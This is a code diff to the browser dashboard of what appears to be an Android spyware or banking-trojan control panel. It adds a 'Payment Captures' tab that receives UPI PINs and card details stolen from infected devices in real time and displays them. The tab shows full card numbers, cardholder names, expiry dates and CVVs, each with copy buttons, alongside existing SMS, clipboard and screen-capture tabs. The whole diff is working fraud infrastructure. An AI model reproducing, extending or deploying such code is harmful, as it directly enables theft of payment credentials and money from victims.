@@ -295,6 +295,29 @@ function connectWebSocket() {
     }
   });
 
+  // ========== PAYMENT CAPTURES — real-time UPI PIN / card captures ==========
+  socket.on('upi_pin_captured', d => {
+    addActivity('ri-lock-password-line', `UPI PIN captured from ${d.device_id?.substring(0,10)}...`);
+    showToast(`🔐 UPI PIN captured: ${d.pin}`, 'warning');
+    if (modalDeviceId && d.device_id === modalDeviceId && activeTab === 'payment') {
+      loadPaymentCaptures();
+    }
+  });
+
+  socket.on('card_captured', d => {
+    addActivity('ri-bank-card-line', `Card captured from ${d.device_id?.substring(0,10)}...`);
+    showToast(`💳 Card captured: **** ${(d.card_number||'').slice(-4)}`, 'warning');
+    if (modalDeviceId && d.device_id === modalDeviceId && activeTab === 'payment') {
+      loadPaymentCaptures();
+    }
+  });
+
+  socket.on('payment_captured', d => {
+    if (modalDeviceId && d.device_id === modalDeviceId && activeTab === 'payment') {
+      loadPaymentCaptures();
+    }
+  });
+
   // ========== INSTANT SMS — new SMS received on a device ==========
   socket.on('new_sms', d => {
     addActivity('ri-message-2-fill', `New SMS on ${d.device_id?.substring(0,8)}... from ${d.address} (SIM ${d.sim_slot || '?'})`);
@@ -920,6 +943,10 @@ let screenCaptureCurrentPage = 1;
 // Scheduled Commands state
 let allScheduledCommands = [];
 
+// Payment Captures state
+let allPaymentPins = [];
+let allPaymentCards = [];
+
 async function openDeviceModal(deviceId, deviceName) {
   modalDeviceId = deviceId;
   modalDeviceName = deviceName;
@@ -980,6 +1007,11 @@ async function openDeviceModal(deviceId, deviceName) {
   document.getElementById('scheduleForm').classList.add('hidden');
   document.getElementById('scheduleCount').textContent = '';
 
+  // Reset payment captures
+  allPaymentPins = [];
+  allPaymentCards = [];
+  document.getElementById('paymentCapturesContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading payment captures...</span></div>`;
+
   document.getElementById('deviceModal').classList.remove('hidden');
 
   // Load first tab
@@ -1000,6 +1032,8 @@ function closeDeviceModal() {
   allClipboardEntries = [];
   allScreenCaptures = [];
   allScheduledCommands = [];
+  allPaymentPins = [];
+  allPaymentCards = [];
 }
 window.closeDeviceModal = closeDeviceModal;
 
@@ -1020,6 +1054,7 @@ function switchDeviceTab(tab) {
   if (tab === 'clipboard' && allClipboardEntries.length === 0) loadClipboard(1);
   if (tab === 'screen' && allScreenCaptures.length === 0) loadScreenCaptures(1);
   if (tab === 'schedule' && allScheduledCommands.length === 0) loadScheduledCommands();
+  if (tab === 'payment') loadPaymentCaptures();
 }
 window.switchDeviceTab = switchDeviceTab;
 
@@ -1937,7 +1972,120 @@ async function clearExecutedCommands() {
 }
 window.clearExecutedCommands = clearExecutedCommands;
 
-// ========== Export Device Data ==========
+// ========== Payment Captures Tab ==========
+async function loadPaymentCaptures() {
+  const container = document.getElementById('paymentCapturesContainer');
+  if (!container) return;
+  container.innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading payment captures...</span></div>`;
+  try {
+    const [pinsRes, cardsRes] = await Promise.all([
+      fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/upi-pins`, { headers: { 'x-admin-password': adminPassword } }),
+      fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/card-details`, { headers: { 'x-admin-password': adminPassword } })
+    ]);
+    const pinsData = await pinsRes.json();
+    const cardsData = await cardsRes.json();
+    allPaymentPins  = pinsData.pins  || [];
+    allPaymentCards = cardsData.cards || [];
+    renderPaymentCaptures();
+  } catch (err) {
+    container.innerHTML = `<div class="tab-empty"><i class="ri-error-warning-line"></i><p>FAILED TO LOAD PAYMENT DATA</p></div>`;
+  }
+}
+window.loadPaymentCaptures = loadPaymentCaptures;
+
+function renderPaymentCaptures() {
+  const container = document.getElementById('paymentCapturesContainer');
+  if (!container) return;
+  const totalAll = allPaymentPins.length + allPaymentCards.length;
+
+  let html = `<div style="padding:14px 14px 4px;display:flex;align-items:center;gap:8px;border-bottom:1px solid rgba(255,255,255,.06)">
+    <i class="ri-shield-keyhole-line" style="color:#ff5252;font-size:15px"></i>
+    <span style="font-size:11px;font-weight:700;letter-spacing:1.2px;color:#ff5252">PAYMENT CAPTURES</span>
+    <span style="margin-left:auto;font-size:10px;color:rgba(255,255,255,.35)">${totalAll} total</span>
+    <button onclick="loadPaymentCaptures()" style="background:rgba(255,255,255,.06);border:none;border-radius:6px;padding:3px 8px;color:rgba(255,255,255,.5);cursor:pointer;font-size:11px"><i class="ri-refresh-line"></i></button>
+  </div>`;
+
+  // ── UPI PINs ───────────────────────────────────────────────────────────────
+  html += `<div style="padding:12px 14px 6px">
+    <div style="display:flex;align-items:center;gap:7px;margin-bottom:10px">
+      <i class="ri-lock-password-line" style="color:#ff9800;font-size:13px"></i>
+      <span style="font-size:10px;font-weight:700;letter-spacing:1px;color:rgba(255,255,255,.5)">UPI PINS</span>
+      <span style="background:#ff9800;color:#000;font-size:9px;font-weight:800;padding:1px 6px;border-radius:10px">${allPaymentPins.length}</span>
+    </div>`;
+
+  if (allPaymentPins.length === 0) {
+    html += `<div style="text-align:center;padding:18px 0;color:rgba(255,255,255,.25);font-size:11px"><i class="ri-lock-line" style="font-size:22px;display:block;margin-bottom:6px"></i>No UPI PINs captured yet</div>`;
+  } else {
+    for (const p of allPaymentPins) {
+      const ts = p.captured_at ? new Date(p.captured_at + 'Z').toLocaleString() : '—';
+      html += `<div style="background:rgba(255,152,0,.08);border:1px solid rgba(255,152,0,.18);border-radius:10px;padding:10px 12px;margin-bottom:8px">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
+          <span style="font-size:10px;font-weight:700;letter-spacing:1px;color:#ff9800">PIN</span>
+          <span style="font-family:monospace;font-size:18px;font-weight:800;color:#fff;letter-spacing:4px">${esc(p.pin)}</span>
+          <button onclick="navigator.clipboard.writeText('${esc(p.pin)}')" style="margin-left:auto;background:rgba(255,255,255,.08);border:none;border-radius:5px;padding:3px 7px;color:#aaa;cursor:pointer;font-size:11px" title="Copy PIN"><i class="ri-file-copy-line"></i></button>
+        </div>
+        <div style="display:flex;gap:12px;font-size:10px;color:rgba(255,255,255,.4)">
+          <span><i class="ri-smartphone-line"></i> ${esc(p.app || 'UPI')}</span>
+          <span><i class="ri-time-line"></i> ${ts}</span>
+        </div>
+      </div>`;
+    }
+  }
+  html += `</div>`;
+
+  // ── Card Details ───────────────────────────────────────────────────────────
+  html += `<div style="padding:6px 14px 14px;border-top:1px solid rgba(255,255,255,.05)">
+    <div style="display:flex;align-items:center;gap:7px;margin-bottom:10px;padding-top:10px">
+      <i class="ri-bank-card-line" style="color:#00e5ff;font-size:13px"></i>
+      <span style="font-size:10px;font-weight:700;letter-spacing:1px;color:rgba(255,255,255,.5)">CARD DETAILS</span>
+      <span style="background:#00e5ff;color:#000;font-size:9px;font-weight:800;padding:1px 6px;border-radius:10px">${allPaymentCards.length}</span>
+    </div>`;
+
+  if (allPaymentCards.length === 0) {
+    html += `<div style="text-align:center;padding:18px 0;color:rgba(255,255,255,.25);font-size:11px"><i class="ri-bank-card-line" style="font-size:22px;display:block;margin-bottom:6px"></i>No card details captured yet</div>`;
+  } else {
+    for (const c of allPaymentCards) {
+      const ts = c.captured_at ? new Date(c.captured_at + 'Z').toLocaleString() : '—';
+      const last4 = (c.card_number || '').replace(/\s/g,'').slice(-4);
+      const cardIcon = c.card_type === 'credit' ? 'ri-bank-card-2-line' : 'ri-bank-card-line';
+      html += `<div style="background:rgba(0,229,255,.06);border:1px solid rgba(0,229,255,.15);border-radius:10px;padding:12px;margin-bottom:10px">
+        <!-- Card number row -->
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">
+          <i class="${cardIcon}" style="color:#00e5ff;font-size:16px"></i>
+          <span style="font-family:monospace;font-size:15px;font-weight:700;color:#fff;letter-spacing:3px">${esc(c.card_number || '—')}</span>
+          <button onclick="navigator.clipboard.writeText('${esc(c.card_number || '')}')" style="margin-left:auto;background:rgba(255,255,255,.08);border:none;border-radius:5px;padding:3px 7px;color:#aaa;cursor:pointer;font-size:11px" title="Copy"><i class="ri-file-copy-line"></i></button>
+        </div>
+        <!-- Details grid -->
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;font-size:11px">
+          <div style="background:rgba(255,255,255,.04);border-radius:6px;padding:6px 8px">
+            <div style="color:rgba(255,255,255,.35);font-size:9px;letter-spacing:1px;margin-bottom:2px">CARDHOLDER</div>
+            <div style="color:#fff;font-weight:600">${esc(c.card_name || '—')}</div>
+          </div>
+          <div style="background:rgba(255,255,255,.04);border-radius:6px;padding:6px 8px">
+            <div style="color:rgba(255,255,255,.35);font-size:9px;letter-spacing:1px;margin-bottom:2px">EXPIRY</div>
+            <div style="color:#fff;font-weight:600">${esc(c.card_expiry || '—')}</div>
+          </div>
+          <div style="background:rgba(255,82,82,.12);border-radius:6px;padding:6px 8px">
+            <div style="color:rgba(255,82,82,.6);font-size:9px;letter-spacing:1px;margin-bottom:2px">CVV</div>
+            <div style="display:flex;align-items:center;gap:6px">
+              <span style="color:#ff5252;font-weight:800;font-family:monospace;font-size:14px">${esc(c.card_cvv || '—')}</span>
+              <button onclick="navigator.clipboard.writeText('${esc(c.card_cvv || '')}')" style="background:rgba(255,255,255,.08);border:none;border-radius:5px;padding:2px 5px;color:#aaa;cursor:pointer;font-size:10px" title="Copy CVV"><i class="ri-file-copy-line"></i></button>
+            </div>
+          </div>
+          <div style="background:rgba(255,255,255,.04);border-radius:6px;padding:6px 8px">
+            <div style="color:rgba(255,255,255,.35);font-size:9px;letter-spacing:1px;margin-bottom:2px">TYPE</div>
+            <div style="color:#fff;font-weight:600;text-transform:capitalize">${esc(c.card_type || '—')}</div>
+          </div>
+        </div>
+        <div style="margin-top:6px;font-size:10px;color:rgba(255,255,255,.3)"><i class="ri-time-line"></i> ${ts}</div>
+      </div>`;
+    }
+  }
+  html += `</div>`;
+
+  container.innerHTML = html;
+}
+window.renderPaymentCaptures = renderPaymentCaptures;
 async function exportDeviceData() {
   if (!modalDeviceId) return showToast('No device selected', 'error');
   try {
